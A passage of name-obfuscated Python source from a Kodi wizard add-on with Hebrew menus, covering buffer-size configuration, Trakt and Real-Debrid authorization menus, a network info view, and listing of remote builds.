         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1679
   try :#line:1696
    return O0OOOOOOO0OO00O0O #line:1697
   except :pass #line:1698
def getpass ():#line:1699
	disply_hwr2 ()#line:1701
def setpass ():#line:1702
    O0OO000O0O0OO000O =xbmcgui .Dialog ()#line:1703
    O0OOO0O0O000O0O00 =''#line:1704
    OO0OOO0OOO0OO0000 =xbmc .Keyboard (O0OOO0O0O000O0O00 ,'הכנס סיסמה')#line:1706
    OO0OOO0OOO0OO0000 .doModal ()#line:1707
    if OO0OOO0OOO0OO0000 .isConfirmed ():#line:1708
           OO0OOO0OOO0OO0000 =OO0OOO0OOO0OO0000 .getText ()#line:1709
    wiz .setS ('pass',str (OO0OOO0OOO0OO0000 ))#line:1710
def setuname ():#line:1711
    OO0OOO0OO0000000O =''#line:1712
    OOO0OO00O0000O0OO =xbmc .Keyboard (OO0OOO0OO0000000O ,'הכנס שם משתמש')#line:1713
    OOO0OO00O0000O0OO .doModal ()#line:1714
    if OOO0OO00O0000O0OO .isConfirmed ():#line:1715
           OO0OOO0OO0000000O =OOO0OO00O0000O0OO .getText ()#line:1716
           wiz .setS ('user',str (OO0OOO0OO0000000O ))#line:1717
def powerkodi ():#line:1718
    os ._exit (1 )#line:1719
def buffer1 ():#line:1721
	O00O0O00O0O0O0OOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1722
	O00OO0OO000OOO0O0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1723
	OOO0O00OO0OOO0OO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1724
	OO0OOOO0OOO0O0O0O =re .sub ('[^0-9]','',OOO0O00OO0OOO0OO0 )#line:1725
	OO0OOOO0OOO0O0O0O =int (OO0OOOO0OOO0O0O0O )/3 #line:1726
	O00O00OO0O00OOOOO =OO0OOOO0OOO0O0O0O *1024 *1024 #line:1727
	try :O0O00OOOOO00O0OOO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1728
	except :O0O00OOOOO00O0OOO =16 #line:1729
	OO0O0OOOO00O0OOOO =DIALOG .yesno ('FREE MEMORY: '+str (OOO0O00OO0OOO0OO0 ),'Based on your free Memory your optimal buffersize is: '+str (OO0OOOO0OOO0O0O0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1732
	if OO0O0OOOO00O0OOOO ==1 :#line:1733
		with open (O00O0O00O0O0O0OOO ,"w")as O00OO000OO0OOOOO0 :#line:1734
			if O0O00OOOOO00O0OOO >=17 :O000O00OOOO00O00O =xml_data_advSettings_New (str (O00O00OO0O00OOOOO ))#line:1735
			else :O000O00OOOO00O00O =xml_data_advSettings_old (str (O00O00OO0O00OOOOO ))#line:1736
			O00OO000OO0OOOOO0 .write (O000O00OOOO00O00O )#line:1738
			DIALOG .ok ('Buffer Size Set to: '+str (O00O00OO0O00OOOOO ),'Please restart Kodi for settings to apply.','')#line:1739
	elif OO0O0OOOO00O0OOOO ==0 :#line:1741
		O00O00OO0O00OOOOO =_OOO0O000O0OOOO0OO (default =str (O00O00OO0O00OOOOO ),heading ="INPUT BUFFER SIZE")#line:1742
		with open (O00O0O00O0O0O0OOO ,"w")as O00OO000OO0OOOOO0 :#line:1743
			if O0O00OOOOO00O0OOO >=17 :O000O00OOOO00O00O =xml_data_advSettings_New (str (O00O00OO0O00OOOOO ))#line:1744
			else :O000O00OOOO00O00O =xml_data_advSettings_old (str (O00O00OO0O00OOOOO ))#line:1745
			O00OO000OO0OOOOO0 .write (O000O00OOOO00O00O )#line:1746
			DIALOG .ok ('Buffer Size Set to: '+str (O00O00OO0O00OOOOO ),'Please restart Kodi for settings to apply.','')#line:1747
def xml_data_advSettings_old (O0O0OOO00O0O00O00 ):#line:1748
	OO0O00O0O0O000000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0O0OOO00O0O00O00 #line:1758
	return OO0O00O0O0O000000 #line:1759
def xml_data_advSettings_New (OO000OOOO0OO00OO0 ):#line:1761
	O000OO00OOOO0OOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO000OOOO0OO00OO0 #line:1773
	return O000OO00OOOO0OOOO #line:1774
def write_ADV_SETTINGS_XML (O0OOOOOOOO0O00000 ):#line:1775
    if not os .path .exists (xml_file ):#line:1776
        with open (xml_file ,"w")as O0O0O0OO0OO0OOO0O :#line:1777
            O0O0O0OO0OO0OOO0O .write (xml_data )#line:1778
def _OOO0O000O0OOOO0OO (default ="",heading ="",hidden =False ):#line:1779
    ""#line:1780
    OO000O0OOO0OO000O =xbmc .Keyboard (default ,heading ,hidden )#line:1781
    OO000O0OOO0OO000O .doModal ()#line:1782
    if (OO000O0OOO0OO000O .isConfirmed ()):#line:1783
        return unicode (OO000O0OOO0OO000O .getText (),"utf-8")#line:1784
    return default #line:1785
def index ():#line:1787
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1788
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1789
	if AUTOUPDATE =='Yes':#line:1790
		if wiz .workingURL (WIZARDFILE )==True :#line:1791
			O000O00OOO00O0OO0 =wiz .checkWizard ('version')#line:1792
			if O000O00OOO00O0OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O000O00OOO00O0OO0 ),'wizardupdate',themeit =THEME2 )#line:1793
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1794
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1795
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1796
	if len (BUILDNAME )>0 :#line:1797
		OOOOO0000O00O0O0O =wiz .checkBuild (BUILDNAME ,'version')#line:1798
		O0O00O0OOOOO00OOO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1799
		if OOOOO0000O00O0O0O >BUILDVERSION :O0O00O0OOOOO00OOO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O00O0OOOOO00OOO ,OOOOO0000O00O0O0O )#line:1800
		addDir (O0O00O0OOOOO00OOO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1802
		try :#line:1804
		     O0OOO0O00OOOOO0O0 =wiz .themeCount (BUILDNAME )#line:1805
		except :#line:1806
		   O0OOO0O00OOOOO0O0 =False #line:1807
		if not O0OOO0O00OOOOO0O0 ==False :#line:1808
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1809
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1810
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1813
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1814
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1815
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1819
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1821
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1823
def morsetup ():#line:1825
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1826
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1827
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1828
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1829
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1833
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1834
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1837
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1838
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1840
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1841
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1849
	setView ('files','viewType')#line:1850
def morsetup2 ():#line:1851
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1852
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1853
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1854
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1855
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1856
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1857
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1858
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1859
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1861
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1862
def fastupdate ():#line:1863
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1864
def forcefastupdate ():#line:1866
			O0000O00O0OO00O00 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1867
			wiz .ForceFastUpDate (ADDONTITLE ,O0000O00O0OO00O00 )#line:1868
def rdsetup ():#line:1872
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1873
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1874
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1875
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1876
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1877
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1878
	setView ('files','viewType')#line:1879
def traktsetup ():#line:1881
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1882
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1883
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1884
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1885
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1888
	setView ('files','viewType')#line:1889
def resolveurlsetup ():#line:1891
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1892
def urlresolversetup ():#line:1893
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1894
def placentasetup ():#line:1896
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1897
def reptiliasetup ():#line:1898
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1899
def flixnetsetup ():#line:1900
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1901
def yodasetup ():#line:1902
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1903
def numberssetup ():#line:1904
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1905
def uranussetup ():#line:1906
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1907
def genesissetup ():#line:1908
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1909
def net_tools (view =None ):#line:1911
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1912
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1913
	setView ('files','viewType')#line:1915
def speedMenu ():#line:1916
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1917
def viewIP ():#line:1918
	O0O0OO0O0O0000OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1932
	O00000O00000O0000 =[];OO000O0O0OO0OO0O0 =0 #line:1933
	for OO000O000000O00OO in O0O0OO0O0O0000OO0 :#line:1934
		OO00O0OOO0OO00O0O =wiz .getInfo (OO000O000000O00OO )#line:1935
		OO000O0OOO0000OOO =0 #line:1936
		while OO00O0OOO0OO00O0O =="Busy"and OO000O0OOO0000OOO <10 :#line:1937
			OO00O0OOO0OO00O0O =wiz .getInfo (OO000O000000O00OO );OO000O0OOO0000OOO +=1 ;wiz .log ("%s sleep %s"%(OO000O000000O00OO ,str (OO000O0OOO0000OOO )));xbmc .sleep (1000 )#line:1938
		O00000O00000O0000 .append (OO00O0OOO0OO00O0O )#line:1939
		OO000O0O0OO0OO0O0 +=1 #line:1940
	O000000O00OO0OO0O ,O00OO00O000OO00O0 ,OOO0O0O000O0O0OO0 =getIP ()#line:1941
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00000O0000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1942
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000O00OO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1943
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00O000OO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1944
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O000O0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1945
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00000O0000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1946
	setView ('files','viewType')#line:1947
def buildMenu ():#line:1949
	if USERNAME =='':#line:1950
		ADDON .openSettings ()#line:1951
		sys .exit ()#line:1952
	if PASSWORD =='':#line:1953
		ADDON .openSettings ()#line:1954
	O0OO00OOOO0O0O0O0 =u_list (SPEEDFILE )#line:1955
	(O0OO00OOOO0O0O0O0 )#line:1956
	O0O00O00O0OOO0O0O =(wiz .workingURL (O0OO00OOOO0O0O0O0 ))#line:1957
	(O0O00O00O0OOO0O0O )#line:1958
	O0O00O00O0OOO0O0O =wiz .workingURL (SPEEDFILE )#line:1959
	if not O0O00O00O0OOO0O0O ==True :#line:1960
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1961
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1962
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1963
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1964
		addFile ('%s'%O0O00O00O0OOO0O0O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1965
	else :#line:1966
		OOOO00OO00000O000 ,OOO000OO0OO00O00O ,OOO0O00OOOOO0O0O0 ,OO0OO00O0000O0OO0 ,O00O00OO0OO0O0000 ,OO00OOO00000O0OO0 ,OO0O0O00O00O0OO00 =wiz .buildCount ()#line:1967
		O0OO0O0OOO0OOOO00 =False ;OOOOO000OO0000O00 =[]#line:1968
		if THIRDPARTY =='true':#line:1969
			if not THIRD1NAME ==''and not THIRD1URL =='':O0OO0O0OOO0OOOO00 =True ;OOOOO000OO0000O00 .append ('1')#line:1970
			if not THIRD2NAME ==''and not THIRD2URL =='':O0OO0O0OOO0OOOO00 =True ;OOOOO000OO0000O00 .append ('2')#line:1971
			if not THIRD3NAME ==''and not THIRD3URL =='':O0OO0O0OOO0OOOO00 =True ;OOOOO000OO0000O00 .append ('3')#line:1972
		OOOOO0000O00O00O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1973
		OO00O0O000O0OO000 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0000O00O00O0 )#line:1974
		if OOOO00OO00000O000 ==1 and O0OO0O0OOO0OOOO00 ==False :#line:1975
			for O000O00OO0O0OO00O ,OO00OO000O0000O00 ,OO0O00OOOOOO00O00 ,OOOO0OO00O00O000O ,OOOOOO000OOOO0OO0 ,OOOO00OOOOOO0OO00 ,O00O0O0OO00OO000O ,O0OO0O00OOOOOOOOO ,O0O000O00O0O0O0OO ,O0O0OO0O0000000OO in OO00O0O000O0OO000 :#line:1976
				if not SHOWADULT =='true'and O0O000O00O0O0O0OO .lower ()=='yes':continue #line:1977
				if not DEVELOPER =='true'and wiz .strTest (O000O00OO0O0OO00O ):continue #line:1978
				viewBuild (OO00O0O000O0OO000 [0 ][0 ])#line:1979
				return #line:1980
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1983
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1984
		if O0OO0O0OOO0OOOO00 ==True :#line:1985
			for OOOO0OO000O000OOO in OOOOO000OO0000O00 :#line:1986
				O000O00OO0O0OO00O =eval ('THIRD%sNAME'%OOOO0OO000O000OOO )#line:1987
		if len (OO00O0O000O0OO000 )>=1 :#line:1989
			if SEPERATE =='true':#line:1990
				for O000O00OO0O0OO00O ,OO00OO000O0000O00 ,OO0O00OOOOOO00O00 ,OOOO0OO00O00O000O ,OOOOOO000OOOO0OO0 ,OOOO00OOOOOO0OO00 ,O00O0O0OO00OO000O ,O0OO0O00OOOOOOOOO ,O0O000O00O0O0O0OO ,O0O0OO0O0000000OO in OO00O0O000O0OO000 :#line:1991
					if not SHOWADULT =='true'and O0O000O00O0O0O0OO .lower ()=='yes':continue #line:1992
					if not DEVELOPER =='true'and wiz .strTest (O000O00OO0O0OO00O ):continue #line:1993
					O0000O00OOOO0OOOO =createMenu ('install','',O000O00OO0O0OO00O )#line:1994
					addDir ('[%s] %s (v%s)'%(float (OOOOOO000OOOO0OO0 ),O000O00OO0O0OO00O ,OO00OO000O0000O00 ),'viewbuild',O000O00OO0O0OO00O ,description =O0O0OO0O0000000OO ,fanart =O0OO0O00OOOOOOOOO ,icon =O00O0O0OO00OO000O ,menu =O0000O00OOOO0OOOO ,themeit =THEME2 )#line:1995
			else :#line:1996
				if OO0OO00O0000O0OO0 >0 :#line:1997
					O0000OO0O00O0000O ='+'if SHOW17 =='false'else '-'#line:1998
					if SHOW17 =='true':#line:2000
						for O000O00OO0O0OO00O ,OO00OO000O0000O00 ,OO0O00OOOOOO00O00 ,OOOO0OO00O00O000O ,OOOOOO000OOOO0OO0 ,OOOO00OOOOOO0OO00 ,O00O0O0OO00OO000O ,O0OO0O00OOOOOOOOO ,O0O000O00O0O0O0OO ,O0O0OO0O0000000OO in OO00O0O000O0OO000 :#line:2002
							if not SHOWADULT =='true'and O0O000O00O0O0O0OO .lower ()=='yes':continue #line:2003
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO0O0OO00O ):continue #line:2004
							OOO00OO0O000OOOOO =int (float (OOOOOO000OOOO0OO0 ))#line:2005
							if OOO00OO0O000OOOOO ==17 :#line:2006
								O0000O00OOOO0OOOO =createMenu ('install','',O000O00OO0O0OO00O )#line:2007
								addDir ('[%s] %s (v%s)'%(float (OOOOOO000OOOO0OO0 ),O000O00OO0O0OO00O ,OO00OO000O0000O00 ),'viewbuild',O000O00OO0O0OO00O ,description =O0O0OO0O0000000OO ,fanart =O0OO0O00OOOOOOOOO ,icon =O00O0O0OO00OO000O ,menu =O0000O00OOOO0OOOO ,themeit =THEME2 )#line:2008
				if O00O00OO0OO0O0000 >0 :#line:2009
					O0000OO0O00O0000O ='+'if SHOW18 =='false'else '-'#line:2010
					if SHOW18 =='true':#line:2012
						for O000O00OO0O0OO00O ,OO00OO000O0000O00 ,OO0O00OOOOOO00O00 ,OOOO0OO00O00O000O ,OOOOOO000OOOO0OO0 ,OOOO00OOOOOO0OO00 ,O00O0O0OO00OO000O ,O0OO0O00OOOOOOOOO ,O0O000O00O0O0O0OO ,O0O0OO0O0000000OO in OO00O0O000O0OO000 :#line:2014
							if not SHOWADULT =='true'and O0O000O00O0O0O0OO .lower ()=='yes':continue #line:2015
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO0O0OO00O ):continue #line:2016
							OOO00OO0O000OOOOO =int (float (OOOOOO000OOOO0OO0 ))#line:2017
							if OOO00OO0O000OOOOO ==18 :#line:2018
								O0000O00OOOO0OOOO =createMenu ('install','',O000O00OO0O0OO00O )#line:2019
								addDir ('[%s] %s (v%s)'%(float (OOOOOO000OOOO0OO0 ),O000O00OO0O0OO00O ,OO00OO000O0000O00 ),'viewbuild',O000O00OO0O0OO00O ,description =O0O0OO0O0000000OO ,fanart =O0OO0O00OOOOOOOOO ,icon =O00O0O0OO00OO000O ,menu =O0000O00OOOO0OOOO ,themeit =THEME2 )#line:2020
				if OOO0O00OOOOO0O0O0 >0 :#line:2021
					O0000OO0O00O0000O ='+'if SHOW16 =='false'else '-'#line:2022
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0000OO0O00O0000O ,OOO0O00OOOOO0O0O0 ),'togglesetting','show16',themeit =THEME3 )#line:2023
					if SHOW16 =='true':#line:2024
						for O000O00OO0O0OO00O ,OO00OO000O0000O00 ,OO0O00OOOOOO00O00 ,OOOO0OO00O00O000O ,OOOOOO000OOOO0OO0 ,OOOO00OOOOOO0OO00 ,O00O0O0OO00OO000O ,O0OO0O00OOOOOOOOO ,O0O000O00O0O0O0OO ,O0O0OO0O0000000OO in OO00O0O000O0OO000 :#line:2025
							if not SHOWADULT =='true'and O0O000O00O0O0O0OO .lower ()=='yes':continue #line:2026
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO0O0OO00O ):continue #line:2027
							OOO00OO0O000OOOOO =int (float (OOOOOO000OOOO0OO0 ))#line:2028
							if OOO00OO0O000OOOOO ==16 :#line:2029
								O0000O00OOOO0OOOO =createMenu ('install','',O000O00OO0O0OO00O )#line:2030
								addDir ('[%s] %s (v%s)'%(float (OOOOOO000OOOO0OO0 ),O000O00OO0O0OO00O ,OO00OO000O0000O00 ),'viewbuild',O000O00OO0O0OO00O ,description =O0O0OO0O0000000OO ,fanart =O0OO0O00OOOOOOOOO ,icon =O00O0O0OO00OO000O ,menu =O0000O00OOOO0OOOO ,themeit =THEME2 )#line:2031
				if OOO000OO0OO00O00O >0 :#line:2032
					O0000OO0O00O0000O ='+'if SHOW15 =='false'else '-'#line:2033
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0000OO0O00O0000O ,OOO000OO0OO00O00O ),'togglesetting','show15',themeit =THEME3 )#line:2034
					if SHOW15 =='true':#line:2035
						for O000O00OO0O0OO00O ,OO00OO000O0000O00 ,OO0O00OOOOOO00O00 ,OOOO0OO00O00O000O ,OOOOOO000OOOO0OO0 ,OOOO00OOOOOO0OO00 ,O00O0O0OO00OO000O ,O0OO0O00OOOOOOOOO ,O0O000O00O0O0O0OO ,O0O0OO0O0000000OO in OO00O0O000O0OO000 :#line:2036
							if not SHOWADULT =='true'and O0O000O00O0O0O0OO .lower ()=='yes':continue #line:2037
							if not DEVELOPER =='true'and wiz .strTest (O000O00OO0O0OO00O ):continue #line:2038
							OOO00OO0O000OOOOO =int (float (OOOOOO000OOOO0OO0 ))#line:2039
							if OOO00OO0O000OOOOO <=15 :#line:2040
								O0000O00OOOO0OOOO =createMenu ('install','',O000O00OO0O0OO00O )#line:2041
								addDir ('[%s] %s (v%s)'%(float (OOOOOO000OOOO0OO0 ),O000O00OO0O0OO00O ,OO00OO000O0000O00 ),'viewbuild',O000O00OO0O0OO00O ,description =O0O0OO0O0000000OO ,fanart =O0OO0O00OOOOOOOOO ,icon =O00O0O0OO00OO000O ,menu =O0000O00OOOO0OOOO ,themeit =THEME2 )#line:2042
		elif OO0O0O00O00O0OO00 >0 :#line:2043
			if OO00OOO00000O0OO0 >0 :#line:2044
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2045
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2046
			else :#line:2047
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2048
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
	setView ('files','viewType')#line:2050
def viewBuild (OO00OOO00000O0OOO ):#line:2052
	OOO0O0O0O0OOO0000 =wiz .workingURL (SPEEDFILE )#line:2053
	if not OOO0O0O0O0OOO0000 ==True :#line:2054
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2055
		addFile ('%s'%OOO0O0O0O0OOO0000 ,'',themeit =THEME3 )#line:2056
		return #line:2057
	if wiz .checkBuild (OO00OOO00000O0OOO ,'version')==False :#line:2058
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2059
		addFile ('%s was not found in the builds list.'%OO00OOO00000O0OOO ,'',themeit =THEME3 )#line:2060
		return #line:2061
	OO00OOO0O00OOOOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2062
	OOOOO0O00O00O0OOO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00OOO00000O0OOO ).findall (OO00OOO0O00OOOOO0 )#line:2063
	for O0OO00000O0O00O00 ,OOOO0OO0O000000O0 ,OO000O0O0OO0OOOO0 ,O000OOO0OO00O00O0 ,O00OO0OO0OOOO0OOO ,OO00OOO0O00OOOOOO ,OO000O00O00OOO0OO ,OO00OOOO0OO000OOO ,O000O0O0OO00O00OO ,OOO000O00OOO0OO00 in OOOOO0O00O00O0OOO :#line:2064
		OO00OOO0O00OOOOOO =OO00OOO0O00OOOOOO if wiz .workingURL (OO00OOO0O00OOOOOO )else ICON #line:2065
		OO000O00O00OOO0OO =OO000O00O00OOO0OO if wiz .workingURL (OO000O00O00OOO0OO )else FANART #line:2066
		O000OOOOOO0OOOO00 ='%s (v%s)'%(OO00OOO00000O0OOO ,O0OO00000O0O00O00 )#line:2067
